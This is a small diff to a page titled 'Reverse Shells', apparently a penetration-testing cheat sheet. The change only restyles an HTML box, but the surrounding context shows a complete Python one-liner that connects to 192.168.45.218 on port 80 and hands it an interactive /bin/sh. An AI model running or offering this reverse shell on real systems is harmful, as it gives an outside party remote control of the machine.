@@ -3,7 +3,7 @@ title: "Reverse Shells"
 ---
 
 Python:
-<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace; width: 500px; white-space: pre-wrap;">
+<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: block; font-family: 'Courier New', Courier, monospace; width: auto; max-width: 500px; white-space: pre-wrap;">
   <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>
 </div>
 
